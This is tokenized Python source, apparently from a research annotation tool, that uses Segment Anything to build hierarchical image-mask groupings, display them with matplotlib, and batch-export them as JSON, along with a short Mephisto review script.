predictor , grid_points ) <EOL> def predict_for_points ( <EOL> predictor : "<STR_LIT>" , <EOL> points : List [ Point ] , <EOL> ) -> Dict [ Point , List [ EfficientMask ] ] : <EOL> results : Dict [ Point , List [ EfficientMask ] ] = { } <EOL> for pt in points : <EOL> masks , scores , _ = predictor . predict ( <EOL> point_coords = np . array ( [ [ pt [ <NUM_LIT> ] , pt [ <NUM_LIT> ] ] ] ) , <EOL> point_labels = np . array ( [ <NUM_LIT> ] ) , <EOL> multimask_output = True , <EOL> ) <EOL> results [ pt ] = [ EfficientMask ( m , s ) for m , s in zip ( masks , scores ) ] <EOL> return results <EOL> def predict_for_bounded_points ( <EOL> predictor : "<STR_LIT>" , <EOL> image : np . ndarray , <EOL> points : List [ Point ] , <EOL> mask : EfficientMask , <EOL> ) -> Dict [ Point , List [ EfficientMask ] ] : <EOL> ( top , left ) , ( bottom , right ) = mask . get_tlbr ( ) <EOL> bounded_image = image [ top : bottom , left : right , : ] <EOL> predictor . set_image ( bounded_image ) <EOL> results : Dict [ Point , List [ EfficientMask ] ] = { } <EOL> for pt in points : <EOL> masks , scores , _ = predictor . predict ( <EOL> point_coords = np . array ( [ [ pt [ <NUM_LIT> ] - top , pt [ <NUM_LIT> ] - left ] ] ) , <EOL> point_labels = np . array ( [ <NUM_LIT> ] ) , <EOL> multimask_output = False , <EOL> ) <EOL> new_masks = [ ] <EOL> for new_mask in masks : <EOL> base_mask = np . full ( bounded_image . shape [ : <NUM_LIT> ] , False ) <EOL> base_mask [ top : bottom , left : right ] = new_mask <EOL> new_masks . append ( base_mask ) <EOL> results [ ( pt [ <NUM_LIT> ] , pt [ <NUM_LIT> ] ) ] = [ EfficientMask ( m , s ) for m , s in zip ( new_masks , scores ) ] <EOL> return results <EOL> def get_canny_masks ( <EOL> predictor : "<STR_LIT>" , <EOL> image : np . ndarray , <EOL> distance_threshold : int = <NUM_LIT> , <EOL> jitter_amount : int = <NUM_LIT> <EOL> ) : <EOL> points = get_points_from_canny_greedy ( image , distance_threshold = distance_threshold , jitter_amount = jitter_amount ) <EOL> return predict_for_points ( predictor , points ) <EOL> def process_best_largest ( <EOL> results : Dict [ Point , List [ EfficientMask ] ] , <EOL> penalty_gap : float = <NUM_LIT> , <EOL> ) -> Dict [ Point , Dict [ MaskMergeKey , EfficientMask ] ] : <EOL> processed_results : Dict [ Point , Dict [ MaskMergeKey , EfficientMask ] ] = { } <EOL> for pt , ems in results . items ( ) : <EOL> best_mask = ems [ <NUM_LIT> ] <EOL> largest_mask = ems [ <NUM_LIT> ] <EOL> for oem in ems [ <NUM_LIT> : ] : <EOL> if oem . score > best_mask . score : <EOL> best_mask = oem <EOL> for oem in ems [ <NUM_LIT> : ] : <EOL> if oem . get_size ( ) > largest_mask . get_size ( ) : <EOL> if oem . score < largest_mask . score and oem . score < best_mask . score - penalty_gap : <EOL> continue <EOL> largest_mask = oem <EOL> processed_results [ pt ] = { '<STR_LIT>' : best_mask , '<STR_LIT>' : largest_mask } <EOL> return processed_results <EOL> def get_groups ( <EOL> processed_results : Dict [ Point , Dict [ MaskMergeKey , EfficientMask ] ] , <EOL> merge_key : MaskMergeKey = '<STR_LIT>' , <EOL> groups : Optional [ GroupDict ] = None , <EOL> ) -> GroupDict : <EOL> if groups is None : <EOL> groups = { } <EOL> curr_idx = <NUM_LIT> <EOL> else : <EOL> curr_idx = max ( [ k for k in groups . keys ( ) if isinstance ( k , int ) ] ) + <NUM_LIT> <EOL> for pt , masks in processed_results . items ( ) : <EOL> if len ( groups ) == <NUM_LIT> : <EOL> groups [ curr_idx ] = { '<STR_LIT>' : [ pt ] , '<STR_LIT>' : masks [ merge_key ] , '<STR_LIT>' : [ ] } <EOL> curr_idx += <NUM_LIT> <EOL> else : <EOL> overlaps = [ ] <EOL> for other_idx , other_group in groups . items ( ) : <EOL> if other_group [ '<STR_LIT>' ] . overlaps_threshold ( masks [ merge_key ] ) : <EOL> overlaps . append ( other_idx ) <EOL> if len ( overlaps ) == <NUM_LIT> : <EOL> groups [ curr_idx ] = { '<STR_LIT>' : [ pt ] , '<STR_LIT>' : masks [ merge_key ] , '<STR_LIT>' : [ ] } <EOL> curr_idx += <NUM_LIT> <EOL> else : <EOL> merge_idx = overlaps [ <NUM_LIT> ] <EOL> groups [ merge_idx ] [ '<STR_LIT>' ] . append ( pt ) <EOL> groups [ merge_idx ] [ '<STR_LIT>' ] = groups [ merge_idx ] [ '<STR_LIT>' ] . union ( masks [ merge_key ] ) <EOL> if len ( overlaps ) > <NUM_LIT> : <EOL> if not SKIP_LOGGING : <EOL> print ( "<STR_LIT>" , masks [ merge_key ] . score ) <EOL> for from_idx in overlaps [ <NUM_LIT> : ] : <EOL> groups [ merge_idx ] [ '<STR_LIT>' ] += groups [ from_idx ] [ '<STR_LIT>' ] <EOL> groups [ merge_idx ] [ '<STR_LIT>' ] = groups [ merge_idx ] [ '<STR_LIT>' ] . union ( groups [ from_idx ] [ '<STR_LIT>' ] ) <EOL> del groups [ from_idx ] <EOL> return groups <EOL> def get_groups_simple ( <EOL> sam_results : List [ EfficientMask ] , <EOL> ) -> FinalGrouping : <EOL> if len ( sam_results ) == <NUM_LIT> : <EOL> return { } <EOL> groups : FinalGrouping = { } <EOL> sublists : Dict [ Union [ int , str ] , List [ EfficientMask ] ] = { } <EOL> curr_idx = <NUM_LIT> <EOL> for mask in sam_results : <EOL> if len ( groups ) == <NUM_LIT> : <EOL> groups [ curr_idx ] = { '<STR_LIT>' : mask , '<STR_LIT>' : { } } <EOL> sublists [ curr_idx ] = [ ] <EOL> curr_idx += <NUM_LIT> <EOL> else : <EOL> has_overlap = None <EOL> for other_idx , other_group in groups . items ( ) : <EOL> if other_group [ '<STR_LIT>' ] . near_equivalent_to ( mask , <NUM_LIT> ) : <EOL> has_overlap = other_idx <EOL> break <EOL> if has_overlap is not None : <EOL> own_score = mask . score <EOL> other_score = groups [ has_overlap ] [ '<STR_LIT>' ] . score <EOL> if own_score > other_score : <EOL> groups [ has_overlap ] [ '<STR_LIT>' ] = mask <EOL> continue <EOL> is_contained = None <EOL> too_close = False <EOL> for other_idx , other_group in groups . items ( ) : <EOL> if mask . mostly_contained_in ( other_group [ '<STR_LIT>' ] , <NUM_LIT> ) : <EOL> is_contained = other_idx <EOL> if mask . get_size ( ) / other_group [ '<STR_LIT>' ] . get_size ( ) > <NUM_LIT> : <EOL> too_close = True <EOL> break <EOL> if too_close : <EOL> own_score = mask . score <EOL> other_score = groups [ is_contained ] [ '<STR_LIT>' ] . score <EOL> if own_score > other_score : <EOL> groups [ is_contained ] [ '<STR_LIT>' ] = mask <EOL> continue <EOL> if is_contained is None : <EOL> groups [ curr_idx ] = { '<STR_LIT>' : mask , '<STR_LIT>' : { } } <EOL> sublists [ curr_idx ] = [ ] <EOL> curr_idx += <NUM_LIT> <EOL> else : <EOL> sublists [ is_contained ] . append ( mask ) <EOL> for group_idx , group in groups . items ( ) : <EOL> group [ '<STR_LIT>' ] = get_groups_simple ( sublists [ group_idx ] ) <EOL> return groups <EOL> def print_groups ( groups : FinalGrouping ) -> None : <EOL> def _get_group_map ( curr_g : FinalGrouping ) -> Dict [ Union [ int , str ] , Any ] : <EOL> return { idx : _get_group_map ( g [ '<STR_LIT>' ] ) for idx , g in curr_g . items ( ) } <EOL> print ( json . dumps ( _get_group_map ( groups ) , indent = <NUM_LIT> ) ) <EOL> def refine_groups_simple ( groups : FinalGrouping , merge_thresh = <NUM_LIT> ) -> FinalGrouping : <EOL> new_final_group : Dict [ Union [ str , int ] , FinalGroup ] = { } <EOL> curr_idx = <NUM_LIT> <EOL> for group in groups . values ( ) : <EOL> group [ '<STR_LIT>' ] = refine_groups_simple ( group [ '<STR_LIT>' ] , merge_thresh ) <EOL> found_overlaps = [ ] <EOL> for other_idx , other_group in new_final_group . items ( ) : <EOL> if group [ '<STR_LIT>' ] . overlaps_threshold ( other_group [ '<STR_LIT>' ] , merge_thresh ) : <EOL> found_overlaps . append ( other_idx ) <EOL> if len ( found_overlaps ) == <NUM_LIT> : <EOL> new_final_group [ curr_idx ] = group <EOL> curr_idx += <NUM_LIT> <EOL> else : <EOL> new_subgroup : FinalGroup = { '<STR_LIT>' : group [ '<STR_LIT>' ] , '<STR_LIT>' : { curr_idx : group } } <EOL> for other_idx in found_overlaps : <EOL> other_group = new_final_group [ other_idx ] <EOL> new_subgroup [ '<STR_LIT>' ] . update ( other_group [ '<STR_LIT>' ] ) <EOL> new_subgroup [ '<STR_LIT>' ] = new_subgroup [ '<STR_LIT>' ] . union ( other_group [ '<STR_LIT>' ] ) <EOL> del new_final_group [ other_idx ] <EOL> new_final_group [ curr_idx ] = new_subgroup <EOL> curr_idx += <NUM_LIT> <EOL> for sg in new_final_group . values ( ) : <EOL> if len ( sg [ '<STR_LIT>' ] ) == <NUM_LIT> and sg [ '<STR_LIT>' ] . near_equivalent_to ( list ( sg [ '<STR_LIT>' ] . values ( ) ) [ <NUM_LIT> ] [ '<STR_LIT>' ] , <NUM_LIT> ) : <EOL> sg [ '<STR_LIT>' ] = list ( sg [ '<STR_LIT>' ] . values ( ) ) [ <NUM_LIT> ] [ '<STR_LIT>' ] <EOL> return new_final_group <EOL> def first_iteration_groups ( <EOL> predictor : "<STR_LIT>" , <EOL> processed_results : Dict [ Point , Dict [ MaskMergeKey , EfficientMask ] ] , <EOL> step : int , <EOL> merge_key : MaskMergeKey = "<STR_LIT>" , <EOL> ) -> GroupDict : <EOL> groups = get_groups ( processed_results , merge_key ) <EOL> group_mask = all_mask_union ( [ p [ '<STR_LIT>' ] . mask for p in groups . values ( ) ] ) <EOL> missing_points = get_missing_points_greedy ( group_mask , int ( step / <NUM_LIT> ) ) <EOL> processed_missing_predictions = process_best_largest ( predict_for_points ( predictor , missing_points ) ) <EOL> processed_results . update ( processed_missing_predictions ) <EOL> final_groups = get_groups ( processed_missing_predictions , merge_key , groups ) <EOL> group_mask = all_mask_union ( [ p [ '<STR_LIT>' ] . mask for p in final_groups . values ( ) ] ) <EOL> final_groups [ "<STR_LIT>" ] = { <EOL> '<STR_LIT>' : [ ] , <EOL> '<STR_LIT>' : EfficientMask ( cast ( np . ndarray , group_mask == False ) , <NUM_LIT> ) , <EOL> "<STR_LIT>" : [ ] , <EOL> } <EOL> return final_groups <EOL> def get_subgroup_mask_lists ( <EOL> groups : GroupDict , <EOL> base_masks : Dict [ Point , List [ EfficientMask ] ] , <EOL> canny_masks : Dict [ Point , List [ EfficientMask ] ] , <EOL> score_cutoff : float = <NUM_LIT> , <EOL> retain_best : bool = False , <EOL> ) -> GroupDict : <EOL> subgroup_mask_lists : Dict [ GroupDictKey , GroupItem ] = { } <EOL> joined_group : Dict [ Point , List [ EfficientMask ] ] = { } <EOL> joined_group . update ( base_masks ) <EOL> joined_group . update ( canny_masks ) <EOL> for group_idx , group in groups . items ( ) : <EOL> if not SKIP_LOGGING : <EOL> print ( f"<STR_LIT>" ) <EOL> target_mask = group [ '<STR_LIT>' ] <EOL> used_masks : List [ EfficientMask ] = [ ] <EOL> total_skipped = <NUM_LIT> <EOL> old_joined_group = joined_group <EOL> joined_group = { } <EOL> for ( y , x ) , ems in tqdm ( old_joined_group . items ( ) , disable = SKIP_LOGGING ) : <EOL> if target_mask . mask [ y , x ] != True : <EOL> joined_group [ ( y , x ) ] = ems <EOL> else : <EOL> for em in ems : <EOL> if em . dense_score ( ) < score_cutoff : <EOL> total_skipped += <NUM_LIT> <EOL> continue <EOL> pos_mask = em . intersect ( target_mask ) <EOL> if pos_mask . near_equivalent_to ( target_mask , thresh = <NUM_LIT> ) : <EOL> total_skipped += <NUM_LIT> <EOL> continue <EOL> used_masks . append ( pos_mask ) <EOL> if not SKIP_LOGGING : <EOL> print ( f"<STR_LIT>" ) <EOL> used_masks . sort ( key = lambda x : x . get_size ( ) , reverse = True ) <EOL> post_filtered_masks : List [ EfficientMask ] = [ ] <EOL> for mask_elem in tqdm ( used_masks , disable = SKIP_LOGGING ) : <EOL> too_similar = False <EOL> for existing_mask in post_filtered_masks : <EOL> if mask_elem . near_equivalent_to ( existing_mask , thresh = <NUM_LIT> ) : <EOL> if retain_best and mask_elem . dense_score ( ) > existing_mask . dense_score ( ) : <EOL> existing_mask . set_to ( mask_elem ) <EOL> too_similar = True <EOL> break <EOL> if not too_similar : <EOL> post_filtered_masks . append ( mask_elem ) <EOL> points : List [ Point ] = [ ] <EOL> subgroup_mask_lists [ group_idx ] = { <EOL> '<STR_LIT>' : target_mask , <EOL> '<STR_LIT>' : post_filtered_masks , <EOL> '<STR_LIT>' : points , <EOL> } <EOL> return subgroup_mask_lists <EOL> def compute_subgroups ( <EOL> group_mask_item : GroupItem , <EOL> contained_in_thresh : float = <NUM_LIT> , <EOL> outer_sim_thresh : float = <NUM_LIT> , <EOL> mutual_sim_thresh : float = <NUM_LIT> , <EOL> retain_best : bool = False , <EOL> ) -> GroupDict : <EOL> submasks = group_mask_item [ '<STR_LIT>' ] <EOL> if len ( submasks ) == <NUM_LIT> : <EOL> return { } <EOL> outer_mask = group_mask_item [ '<STR_LIT>' ] <EOL> group_mask_list : List [ EfficientMask ] = [ ] <EOL> if not SKIP_LOGGING : <EOL> print ( f"<STR_LIT>" ) <EOL> for mask_elem in tqdm ( submasks , disable = SKIP_LOGGING ) : <EOL> if mask_elem . get_size ( ) == <NUM_LIT> : <EOL> continue <EOL> pos_mask = mask_elem . intersect ( outer_mask ) <EOL> if pos_mask . near_equivalent_to ( outer_mask , thresh = outer_sim_thresh ) : <EOL> continue <EOL> too_similar = False <EOL> for existing_mask in group_mask_list : <EOL> if mask_elem . near_equivalent_to ( existing_mask , thresh = mutual_sim_thresh ) : <EOL> if retain_best and mask_elem . dense_score ( ) > existing_mask . dense_score ( ) : <EOL> existing_mask . set_to ( mask_elem ) <EOL> too_similar = True <EOL> break <EOL> elif ( <EOL> ( not mask_elem . mostly_contained_in ( existing_mask , thresh = contained_in_thresh ) ) <EOL> and mask_elem . overlaps_threshold ( existing_mask , thresh = <NUM_LIT> ) <EOL> ) : <EOL> existing_mask . set_to ( mask_elem . union ( existing_mask ) ) <EOL> too_similar = True <EOL> break <EOL> if not too_similar : <EOL> group_mask_list . append ( mask_elem ) <EOL> if len ( group_mask_list ) == <NUM_LIT> : <EOL> return { } <EOL> new_groups : GroupDict = { } <EOL> group_idx = <NUM_LIT> <EOL> if not SKIP_LOGGING : <EOL> print ( f"<STR_LIT>" ) <EOL> for mask_item in tqdm ( group_mask_list , disable = SKIP_LOGGING ) : <EOL> found = False <EOL> for group in new_groups . values ( ) : <EOL> if mask_item . mostly_contained_in ( group [ '<STR_LIT>' ] , thresh = contained_in_thresh ) : <EOL> group [ '<STR_LIT>' ] . append ( mask_item ) <EOL> found = True <EOL> break <EOL> if not found : <EOL> new_groups [ group_idx ] = { <EOL> '<STR_LIT>' : mask_item , <EOL> '<STR_LIT>' : [ ] , <EOL> '<STR_LIT>' : [ ] , <EOL> } <EOL> group_idx += <NUM_LIT> <EOL> if not SKIP_LOGGING : <EOL> print ( f"<STR_LIT>" ) <EOL> for small_idx in tqdm ( reversed ( range ( group_idx ) ) , disable = SKIP_LOGGING ) : <EOL> for big_idx in range ( group_idx ) : <EOL> if big_idx == small_idx : <EOL> break <EOL> smaller_group = new_groups [ small_idx ] <EOL> bigger_group = new_groups [ big_idx ] <EOL> bigger_group [ '<STR_LIT>' ] = bigger_group [ '<STR_LIT>' ] . subtract ( smaller_group [ '<STR_LIT>' ] ) <EOL> bigger_group [ '<STR_LIT>' ] = [ <EOL> m . subtract ( smaller_group [ '<STR_LIT>' ] ) for m in bigger_group [ '<STR_LIT>' ] <EOL> ] <EOL> all_masks = all_mask_union ( [ g [ '<STR_LIT>' ] . mask for g in new_groups . values ( ) ] ) <EOL> empty_mask = outer_mask . subtract ( EfficientMask ( all_masks , <NUM_LIT> ) ) <EOL> if not empty_mask . near_equivalent_to ( outer_mask , thresh = outer_sim_thresh ) : <EOL> new_groups [ '<STR_LIT>' ] = { '<STR_LIT>' : empty_mask , '<STR_LIT>' : [ ] , '<STR_LIT>' : [ ] } <EOL> return new_groups <EOL> def add_points_in_mask ( <EOL> predictor : "<STR_LIT>" , <EOL> image : np . ndarray , <EOL> item : GroupItem , <EOL> score_cutoff : float = <NUM_LIT> , <EOL> num_points = <NUM_LIT> , <EOL> ) -> GroupItem : <EOL> top_left , bottom_right = item [ '<STR_LIT>' ] . get_tlbr ( ) <EOL> ( t , l ) , ( b , r ) = top_left , bottom_right <EOL> step = int ( min ( b - t , r - l ) / <NUM_LIT> ) <EOL> if step == <NUM_LIT> : <EOL> return item <EOL> points = get_grid ( step , top_left , bottom_right ) <EOL> random . shuffle ( points ) <EOL> points = points [ : num_points ] <EOL> point_submasks = predict_for_bounded_points ( predictor , image , points , item [ '<STR_LIT>' ] ) <EOL> for more_submasks in point_submasks . values ( ) : <EOL> for mask in more_submasks : <EOL> if mask . score < score_cutoff : <EOL> continue <EOL> if mask . get_density ( ) < <NUM_LIT> : <EOL> continue <EOL> item [ '<STR_LIT>' ] . append ( mask . intersect ( item [ '<STR_LIT>' ] ) ) <EOL> item [ '<STR_LIT>' ] = sorted ( item [ '<STR_LIT>' ] , key = lambda x : x . get_size ( ) , reverse = True ) <EOL> return item <EOL> def compute_subgroup_recursively ( <EOL> predictor : "<STR_LIT>" , <EOL> image : np . ndarray , <EOL> group_mask_item : GroupItem , <EOL> score_cutoff : float = <NUM_LIT> , <EOL> contained_in_thresh : float = <NUM_LIT> , <EOL> outer_sim_thresh : float = <NUM_LIT> , <EOL> mutual_sim_thresh : float = <NUM_LIT> , <EOL> retain_best : bool = False , <EOL> depth : int = <NUM_LIT> , <EOL> ) -> FinalGroup : <EOL> final_subgrouping : FinalGroup = { <EOL> '<STR_LIT>' : group_mask_item [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : { } <EOL> } <EOL> if depth < <NUM_LIT> and group_mask_item [ '<STR_LIT>' ] . get_density ( ) > <NUM_LIT> : <EOL> group_mask_item = add_points_in_mask ( predictor , image , group_mask_item , score_cutoff = score_cutoff ) <EOL> subgroup_mapping = compute_subgroups ( <EOL> group_mask_item , <EOL> contained_in_thresh = contained_in_thresh , <EOL> outer_sim_thresh = outer_sim_thresh , <EOL> mutual_sim_thresh = mutual_sim_thresh , <EOL> retain_best = retain_best , <EOL> ) <EOL> if not SKIP_LOGGING : <EOL> print ( f"<STR_LIT>" , end = "<STR_LIT>" ) <EOL> if len ( subgroup_mapping ) != <NUM_LIT> : <EOL> final_subgrouping [ '<STR_LIT>' ] = { <EOL> idx : compute_subgroup_recursively ( <EOL> predictor , <EOL> image , <EOL> subgroup_mapping [ idx ] , <EOL> contained_in_thresh = contained_in_thresh , <EOL> outer_sim_thresh = outer_sim_thresh , <EOL> mutual_sim_thresh = mutual_sim_thresh , <EOL> retain_best = retain_best , <EOL> depth = depth + <NUM_LIT> <EOL> ) for idx in subgroup_mapping . keys ( ) <EOL> } <EOL> return final_subgrouping <EOL> def compute_group_tree ( <EOL> predictor : "<STR_LIT>" , <EOL> image : np . ndarray , <EOL> score_cutoff : float = <NUM_LIT> , <EOL> contained_in_thresh : float = <NUM_LIT> , <EOL> outer_sim_thresh : float = <NUM_LIT> , <EOL> mutual_sim_thresh : float = <NUM_LIT> , <EOL> retain_best : bool = False , <EOL> ) -> FinalGrouping : <EOL> blur_image = cv2 . bilateralFilter ( image , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) <EOL> predictor . set_image ( blur_image ) <EOL> result = predict_all ( predictor , image , step = <NUM_LIT> ) <EOL> processed_results = process_best_largest ( result ) <EOL> groups = first_iteration_groups ( predictor , processed_results , step = <NUM_LIT> ) <EOL> canny_masks = get_canny_masks ( predictor , image , distance_threshold = <NUM_LIT> , jitter_amount = <NUM_LIT> ) <EOL> subgroup_mask_lists = get_subgroup_mask_lists ( groups , result , canny_masks , score_cutoff = score_cutoff , retain_best = retain_best ) <EOL> full_group_tree = { idx : compute_subgroup_recursively ( <EOL> predictor , <EOL> image , <EOL> subgroup_mask_lists [ idx ] , <EOL> score_cutoff = score_cutoff , <EOL> contained_in_thresh = contained_in_thresh , <EOL> outer_sim_thresh = outer_sim_thresh , <EOL> mutual_sim_thresh = mutual_sim_thresh , <EOL> retain_best = retain_best , <EOL> ) for idx in subgroup_mask_lists . keys ( ) } <EOL> return full_group_tree <EOL> </s>
<s> import numpy as np <EOL> import matplotlib . pyplot as plt <EOL> from . mask_creation_utils import FinalGrouping <EOL> from typing import Optional <EOL> def show_mask ( mask , ax , random_color = False ) : <EOL> if random_color : <EOL> color = np . concatenate ( [ np . random . random ( <NUM_LIT> ) , np . array ( [ <NUM_LIT> ] ) ] , axis = <NUM_LIT> ) <EOL> else : <EOL> color = np . array ( [ <NUM_LIT> / <NUM_LIT> , <NUM_LIT> / <NUM_LIT> , <NUM_LIT> / <NUM_LIT> , <NUM_LIT> ] ) <EOL> h , w = mask . shape [ - <NUM_LIT> : ] <EOL> mask_image = mask . reshape ( h , w , <NUM_LIT> ) * color . reshape ( <NUM_LIT> , <NUM_LIT> , - <NUM_LIT> ) <EOL> ax . imshow ( mask_image ) <EOL> def show_masks ( masks , ax ) : <EOL> sorted_masks = sorted ( masks , key = lambda m : np . sum ( m * <NUM_LIT> ) , reverse = True ) <EOL> for mask in sorted_masks : <EOL> show_mask ( mask , ax , random_color = True ) <EOL> def show_points ( coords , labels , ax , marker_size = <NUM_LIT> ) : <EOL> pos_points = coords [ labels == <NUM_LIT> ] <EOL> neg_points = coords [ labels == <NUM_LIT> ] <EOL> ax . scatter ( pos_points [ : , <NUM_LIT> ] , pos_points [ : , <NUM_LIT> ] , color = '<STR_LIT>' , marker = '<STR_LIT>' , s = marker_size , edgecolor = '<STR_LIT>' , linewidth = <NUM_LIT> ) <EOL> ax . scatter ( neg_points [ : , <NUM_LIT> ] , neg_points [ : , <NUM_LIT> ] , color = '<STR_LIT>' , marker = '<STR_LIT>' , s = marker_size , edgecolor = '<STR_LIT>' , linewidth = <NUM_LIT> ) <EOL> def display_all_levels ( image : np . ndarray , full_group_tree : FinalGrouping , label : Optional [ str ] = None ) : <EOL> unexplored_depth = list ( full_group_tree . values ( ) ) <EOL> depth_levels = [ ] <EOL> while len ( unexplored_depth ) > <NUM_LIT> : <EOL> depth_levels . append ( [ r [ '<STR_LIT>' ] . mask for r in unexplored_depth ] ) <EOL> next_depth = [ ] <EOL> for elem in unexplored_depth : <EOL> next_depth += list ( elem [ '<STR_LIT>' ] . values ( ) ) <EOL> unexplored_depth = next_depth <EOL> for idx , level in enumerate ( depth_levels ) : <EOL> plt . figure ( figsize = ( <NUM_LIT> , <NUM_LIT> ) ) <EOL> plt . imshow ( image ) <EOL> plt . title ( f"<STR_LIT>" , fontsize = <NUM_LIT> ) <EOL> show_masks ( level , plt . gca ( ) ) <EOL> plt . axis ( '<STR_LIT>' ) <EOL> plt . show ( ) <EOL> </s>
<s> from mephisto . abstractions . databases . local_database import LocalMephistoDB <EOL> from mephisto . tools . examine_utils import run_examine_or_review , print_results <EOL> from mephisto . data_model . worker import Worker <EOL> from mephisto . data_model . unit import Unit <EOL> db = None <EOL> def format_for_printing_data ( data ) : <EOL> global db <EOL> worker_name = Worker . get ( db , data [ "<STR_LIT>" ] ) . worker_name <EOL> contents = data [ "<STR_LIT>" ] <EOL> duration = data [ "<STR_LIT>" ] - data [ "<STR_LIT>" ] <EOL> metadata_string = ( <EOL> f"<STR_LIT>" <EOL> f"<STR_LIT>" <EOL> ) <EOL> outputs = contents [ "<STR_LIT>" ] <EOL> output_string = f"<STR_LIT>" <EOL> return f"<STR_LIT>" <EOL> def main ( ) : <EOL> global db <EOL> db = LocalMephistoDB ( ) <EOL> run_examine_or_review ( db , format_for_printing_data ) <EOL> if __name__ == "<STR_LIT>" : <EOL> main ( ) <EOL> </s>
<s> import time <EOL> import sys <EOL> from segment_anything import sam_model_registry <EOL> from segment_anything . automatic_mask_generator import SamAutomaticMaskGenerator <EOL> from . mask_creation_utils import get_groups_simple , refine_groups_simple , FinalGrouping , FinalGroup , get_points_from_canny_greedy <EOL> from . efficient_mask import EfficientMask <EOL> from PIL import Image <EOL> import numpy as np <EOL> import os <EOL> import base64 <EOL> from io import BytesIO <EOL> import cv2 <EOL> import json <EOL> from typing import TypedDict , List <EOL> LOW = <NUM_LIT> <EOL> HIGH = <NUM_LIT> <EOL> SETEV_MODEL_ROOT = '<STR_LIT>' <EOL> ANNOTATE_ROOT = os . path . dirname ( os . path . dirname ( __file__ ) ) <EOL> SOURCE_DIR = os . path . join ( ANNOTATE_ROOT , "<STR_LIT>" ) <EOL> OUT_DIR = os . path . join ( ANNOTATE_ROOT , "<STR_LIT>" ) <EOL> class SAMResult ( TypedDict ) : <EOL> segmentation : np . ndarray <EOL> bbox : List [ float ] <EOL> area : int <EOL> predicted_iou : float <EOL> point_coords : List [ List [ float ] ] <EOL> stability_score : float <EOL> crop_box : List [ float ] <EOL> def fold_group_tree ( g : FinalGrouping ) : <EOL> def fold_group ( subg : FinalGroup ) : <EOL> outer_mask = subg [ '<STR_LIT>' ] <EOL> mask_img = Image . fromarray ( np . uint8 ( outer_mask . mask * <NUM_LIT> ) ) <EOL> mask_img = mask_img . convert ( '<STR_LIT>' ) <EOL> maskbuf = BytesIO ( ) <EOL> mask_img . save ( maskbuf , format = '<STR_LIT>' , bits = <NUM_LIT> , optimize = True ) <EOL> mask_bytes = maskbuf . getvalue ( ) <EOL> as_base64 = base64 . b64encode ( mask_bytes ) <EOL> as_str = as_base64 . decode ( '<STR_LIT>' ) <EOL> ( t , l ) , ( b , r ) = subg [ '<STR_LIT>' ] . get_tlbr ( ) <EOL> return { <EOL> '<STR_LIT>' : as_str , <EOL> '<STR_LIT>' : int ( outer_mask . get_size ( ) ) , <EOL> '<STR_LIT>' : ( ( int ( t ) , int ( l ) ) , ( int ( b ) , int ( r ) ) ) , <EOL> '<STR_LIT>' : { <EOL> idx : fold_group ( subsubg ) for ( idx , subsubg ) in subg [ '<STR_LIT>' ] . items ( ) <EOL> } <EOL> } <EOL> return { <EOL> idx : fold_group ( subg ) for ( idx , subg ) in g . items ( ) <EOL> } <EOL> def group_outputs ( outputs : List [ SAMResult ] ) -> FinalGrouping : <EOL> as_efficient_masks : List [ EfficientMask ] = [ <EOL> EfficientMask ( <EOL> res [ '<STR_LIT>' ] , <EOL> res [ '<STR_LIT>' ] * ( res [ '<STR_LIT>' ] ** <NUM_LIT> ) , <EOL> size = res [ '<STR_LIT>' ] , <EOL> ) for res in outputs <EOL> ] <EOL> in_order = sorted ( as_efficient_masks , key = lambda x : x . get_size ( ) , reverse = True ) <EOL> return get_groups_simple ( in_order ) <EOL> def main ( ) : <EOL> all_images = os . listdir ( SOURCE_DIR ) <EOL> target_images = all_images [ LOW : HIGH ] <EOL> sam_checkpoint = SETEV_MODEL_ROOT <EOL> model_type = "<STR_LIT>" <EOL> device = "<STR_LIT>" <EOL> sam = sam_model_registry [ model_type ] ( checkpoint = sam_checkpoint ) <EOL> sam . to ( device = device ) <EOL> generator = SamAutomaticMaskGenerator ( <EOL> sam , <EOL> points_per_side = <NUM_LIT> , <EOL> points_per_batch = <NUM_LIT> , <EOL> pred_iou_thresh = <NUM_LIT> , <EOL> stability_score_thresh = <NUM_LIT> , <EOL> stability_score_offset = <NUM_LIT> , <EOL> box_nms_thresh = <NUM_LIT> , <EOL> min_mask_region_area = <NUM_LIT> , <EOL> output_mode = "<STR_LIT>" , <EOL> ) <EOL> first_start = time . time ( ) <EOL> for idx , img in enumerate ( target_images ) : <EOL> try : <EOL> start_time = time . time ( ) <EOL> path = os . path . join ( SOURCE_DIR , img ) <EOL> img_array = cv2 . imread ( path ) <EOL> img_array = cv2 . cvtColor ( img_array , cv2 . COLOR_BGR2RGB ) <EOL> canny_points = get_points_from_canny_greedy ( img_array , distance_threshold = <NUM_LIT> , jitter_amount = <NUM_LIT> , num_extra = <NUM_LIT> ) <EOL> if len ( canny_points ) == <NUM_LIT> : <EOL> canny_results = [ ] <EOL> print ( f"<STR_LIT>" ) <EOL> else : <EOL> points_for_sam = np . array ( [ <EOL> [ pt [ <NUM_LIT> ] / img_array . shape [ <NUM_LIT> ] , pt [ <NUM_LIT> ] / img_array . shape [ <NUM_LIT> ] ] for pt in canny_points <EOL> ] ) <EOL> canny_generator = SamAutomaticMaskGenerator ( <EOL> sam , <EOL> points_per_side = None , <EOL> point_grids = points_for_sam , <EOL> points_per_batch = <NUM_LIT> , <EOL> pred_iou_thresh = <NUM_LIT> , <EOL> stability_score_thresh = <NUM_LIT> , <EOL> stability_score_offset = <NUM_LIT> , <EOL> box_nms_thresh = <NUM_LIT> , <EOL> min_mask_region_area = <NUM_LIT> , <EOL> output_mode = "<STR_LIT>" , <EOL> ) <EOL> canny_results = canny_generator . generate ( img_array ) <EOL> print ( f"<STR_LIT>" ) <EOL> result = generator . generate ( img_array ) <EOL> print ( f"<STR_LIT>" ) <EOL> result += canny_results <EOL> grouped = group_outputs ( result ) <EOL> refined = refine_groups_simple ( grouped ) <EOL> folded = fold_group_tree ( refined ) <EOL> with open ( os . path . join ( OUT_DIR , img + "<STR_LIT>" ) , '<STR_LIT>' ) as json_outf : <EOL> json . dump ( folded , json_outf ) <EOL> print ( f"<STR_LIT>" ) <EOL> except Exception as e : <EOL> print ( f"<STR_LIT>" ) <EOL> if __name__ == '<STR_LIT>' : <EOL> main ( ) <EOL> </s>
